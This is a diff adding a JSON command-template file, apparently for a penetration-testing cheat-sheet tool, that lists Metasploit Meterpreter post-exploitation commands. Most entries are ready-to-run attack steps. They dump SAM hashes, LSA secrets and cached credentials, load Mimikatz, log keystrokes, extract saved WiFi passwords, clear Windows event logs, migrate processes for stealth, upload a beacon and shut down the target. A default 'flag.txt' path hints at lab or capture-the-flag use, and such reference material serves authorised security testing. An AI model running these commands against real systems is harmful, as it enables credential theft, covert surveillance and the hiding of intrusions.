@@ -1,0 +1,387 @@
+{
+  "title": "Metasploit - Post-Exploitation",
+  "commands": [
+    {
+      "args": [],
+      "title": "Get current user ID from the session",
+      "template": "getuid"
+    },
+    {
+      "args": [],
+      "title": "Get system info (OS, arch, domain)",
+      "template": "sysinfo"
+    },
+    {
+      "args": [],
+      "title": "Get current process ID",
+      "template": "getpid"
+    },
+    {
+      "args": [],
+      "title": "Show working directory",
+      "template": "pwd"
+    },
+    {
+      "args": [
+        {
+          "name": "remote_path",
+          "description": "Directory to change to",
+          "default": "C:\\Windows\\Temp"
+        }
+      ],
+      "title": "Change working directory",
+      "template": "cd {remote_path}"
+    },
+    {
+      "args": [],
+      "title": "List running processes",
+      "template": "ps"
+    },
+    {
+      "args": [],
+      "title": "Attempt to get SYSTEM privileges (Windows)",
+      "description": "Uses various techniques to elevate to NT AUTHORITY\\SYSTEM.",
+      "template": "getsystem"
+    },
+    {
+      "args": [
+        {
+          "name": "technique",
+          "description": "Technique number (1-5)",
+          "default": "1"
+        }
+      ],
+      "title": "Get SYSTEM with a specific technique",
+      "description": "1=Named Pipe, 2=Named Pipe (DCOM), 3=Token Duplication, 4=Named Pipe (PrintSpoofer), 5=Token Duplication (RPCSS).",
+      "template": "getsystem -t {technique}"
+    },
+    {
+      "args": [],
+      "title": "Get available process privileges",
+      "description": "Shows which privileges are available and which are enabled.",
+      "template": "getprivs"
+    },
+    {
+      "args": [],
+      "title": "Dump SAM password hashes (Windows)",
+      "description": "Dumps local user password hashes from SAM hive. Requires SYSTEM or local admin.",
+      "template": "hashdump"
+    },
+    {
+      "args": [],
+      "title": "Dump cached domain credentials (Windows)",
+      "description": "Dumps domain credentials cached on the target machine.",
+      "template": "run post/windows/gather/cachedump"
+    },
+    {
+      "args": [],
+      "title": "Dump LSA secrets (Windows)",
+      "description": "Extracts LSA secrets including service account passwords and cached credentials.",
+      "template": "run post/windows/gather/lsa_secrets"
+    },
+    {
+      "args": [],
+      "title": "Smart hashdump (all users + domain controller)",
+      "description": "Dumps local and domain controller account password hashes.",
+      "template": "run post/windows/gather/smart_hashdump"
+    },
+    {
+      "args": [],
+      "title": "Take a screenshot of the desktop",
+      "template": "screenshot"
+    },
+    {
+      "args": [
+        {
+          "name": "view",
+          "description": "Screen/view number to capture (0=primary)",
+          "default": "1"
+        }
+      ],
+      "title": "Take screenshot of a specific monitor",
+      "template": "screenshot -v {view}"
+    },
+    {
+      "args": [],
+      "title": "Start keylogger",
+      "template": "keyscan_start"
+    },
+    {
+      "args": [],
+      "title": "Dump captured keystrokes",
+      "template": "keyscan_dump"
+    },
+    {
+      "args": [],
+      "title": "Stop keylogger",
+      "template": "keyscan_stop"
+    },
+    {
+      "args": [],
+      "title": "Dump process memory (procdump)",
+      "description": "Dumps the memory of the current meterpreter process for offline analysis.",
+      "template": "procdump"
+    },
+    {
+      "args": [
+        {
+          "name": "pid",
+          "description": "PID to dump",
+          "default": "1234"
+        }
+      ],
+      "title": "Dump a specific process's memory",
+      "template": "dump {pid}"
+    },
+    {
+      "args": [],
+      "title": "Load Mimikatz (Kiwi) extension",
+      "description": "Loads the Kiwi extension (Mimikatz) into the meterpreter session. Enables all creds_* commands.",
+      "template": "load kiwi"
+    },
+    {
+      "args": [],
+      "title": "Dump all credentials via Kiwi (Mimikatz)",
+      "description": "Dumps all logon sessions, SAM, LSA, and cached credentials. Requires 'load kiwi' first.",
+      "template": "creds_all"
+    },
+    {
+      "args": [],
+      "title": "Dump SAM via Kiwi (Mimikatz)",
+      "description": "Dumps SAM hashes using Mimikatz. Requires 'load kiwi' first.",
+      "template": "lsa_dump_sam"
+    },
+    {
+      "args": [],
+      "title": "Dump LSA secrets via Kiwi (Mimikatz)",
+      "description": "Dumps LSA secrets using Mimikatz. Requires 'load kiwi' first.",
+      "template": "lsa_dump_secrets"
+    },
+    {
+      "args": [],
+      "title": "List all available Kiwi (Mimikatz) commands",
+      "description": "After 'load kiwi', use this to see all creds_* and lsa_* commands available.",
+      "template": "help kiwi"
+    },
+    {
+      "args": [],
+      "title": "Clear Windows event logs",
+      "description": "Clears Application, System, and Security event logs.",
+      "template": "clearev"
+    },
+    {
+      "args": [
+        {
+          "name": "remote_path",
+          "description": "File to download",
+          "default": "C:\\Users\\Administrator\\Desktop\\flag.txt"
+        }
+      ],
+      "title": "Download a file from target",
+      "template": "download {remote_path}"
+    },
+    {
+      "args": [
+        {
+          "name": "local_path",
+          "description": "File to upload from local system",
+          "default": "/tmp/beacon.exe"
+        },
+        {
+          "name": "remote_path",
+          "description": "Destination path on target",
+          "default": "C:\\Windows\\Temp\\beacon.exe"
+        }
+      ],
+      "title": "Upload a file to target",
+      "template": "upload {local_path} {remote_path}"
+    },
+    {
+      "args": [
+        {
+          "name": "remote_path",
+          "description": "Directory to list",
+          "default": "C:\\"
+        }
+      ],
+      "title": "List directory contents",
+      "template": "ls {remote_path}"
+    },
+    {
+      "args": [
+        {
+          "name": "remote_path",
+          "description": "Directory to create",
+          "default": "C:\\Temp"
+        }
+      ],
+      "title": "Create a directory on target",
+      "template": "mkdir {remote_path}"
+    },
+    {
+      "args": [
+        {
+          "name": "remote_path",
+          "description": "File/directory to delete",
+          "default": "C:\\Users\\Public\\payload.exe"
+        }
+      ],
+      "title": "Delete a file or directory",
+      "template": "rm {remote_path}"
+    },
+    {
+      "args": [
+        {
+          "name": "pattern",
+          "description": "File pattern to search for",
+          "default": "*.docx"
+        }
+      ],
+      "title": "Search for files matching a pattern",
+      "template": "search -f {pattern}"
+    },
+    {
+      "args": [
+        {
+          "name": "remote_path",
+          "description": "Directory to search",
+          "default": "C:\\Users\\"
+        },
+        {
+          "name": "pattern",
+          "description": "Filename pattern",
+          "default": "*.docx"
+        }
+      ],
+      "title": "Search recursively in a specific directory",
+      "template": "search -d {remote_path} -f {pattern}"
+    },
+    {
+      "args": [],
+      "title": "Enumerate logged-on users",
+      "template": "run post/windows/gather/enum_logged_on_users"
+    },
+    {
+      "args": [],
+      "title": "Enumerate installed applications",
+      "template": "run post/windows/gather/enum_applications"
+    },
+    {
+      "args": [],
+      "title": "Enumerate network shares (via registry)",
+      "template": "run post/windows/gather/enum_shares"
+    },
+    {
+      "args": [],
+      "title": "Enumerate installed patches (check missing KBs)",
+      "template": "run post/windows/gather/enum_patches"
+    },
+    {
+      "args": [],
+      "title": "Check if running inside a virtual machine",
+      "template": "run post/windows/gather/checkvm"
+    },
+    {
+      "args": [],
+      "title": "Enumerate AV/EDR products installed",
+      "template": "run post/windows/gather/enum_av"
+    },
+    {
+      "args": [],
+      "title": "Check for local privilege escalation vectors",
+      "template": "run post/multi/recon/local_exploit_suggester"
+    },
+    {
+      "args": [],
+      "title": "Dump recent document LNK files",
+      "description": "Extracts recently opened files via Windows shortcut (.lnk) files.",
+      "template": "run post/windows/gather/dumplinks"
+    },
+    {
+      "args": [],
+      "title": "Enable RDP on target (Windows)",
+      "template": "run post/windows/manage/enable_rdp"
+    },
+    {
+      "args": [],
+      "title": "Dump WiFi networks and passwords",
+      "description": "Lists all saved WiFi networks and their plaintext passwords.",
+      "template": "wifi_list"
+    },
+    {
+      "args": [],
+      "title": "Show mounted drives and shares",
+      "template": "show_mount"
+    },
+    {
+      "args": [
+        {
+          "name": "pid",
+          "description": "PID to migrate into",
+          "default": "1337"
+        }
+      ],
+      "title": "Migrate to another process",
+      "description": "Moves the meterpreter session to a different process for stealth or privilege.",
+      "template": "migrate {pid}"
+    },
+    {
+      "args": [
+        {
+          "name": "command",
+          "description": "Command to execute",
+          "default": "whoami"
+        }
+      ],
+      "title": "Execute a shell command on target",
+      "template": "execute -f {command}"
+    },
+    {
+      "args": [
+        {
+          "name": "command",
+          "description": "Command executable",
+          "default": "cmd.exe"
+        },
+        {
+          "name": "args",
+          "description": "Command arguments",
+          "default": "/c ipconfig /all"
+        }
+      ],
+      "title": "Execute a command with arguments",
+      "template": "execute -f {command} -a \"{args}\""
+    },
+    {
+      "args": [],
+      "title": "Spawn interactive system shell (cmd/bash)",
+      "template": "shell"
+    },
+    {
+      "args": [],
+      "title": "Open a PowerShell prompt via session",
+      "template": "execute -f powershell -i"
+    },
+    {
+      "args": [],
+      "title": "Check user idle time on desktop",
+      "template": "idletime"
+    },
+    {
+      "args": [],
+      "title": "Get target's local IP address",
+      "template": "get_local_ip"
+    },
+    {
+      "args": [],
+      "title": "Reboot the target machine",
+      "description": "Reboots the target. Use with caution — requires 'reload' after to re-establish session.",
+      "template": "reboot"
+    },
+    {
+      "args": [],
+      "title": "Shutdown the target machine (final, no recovery)",
+      "template": "shutdown"
+    }
+  ]
+}
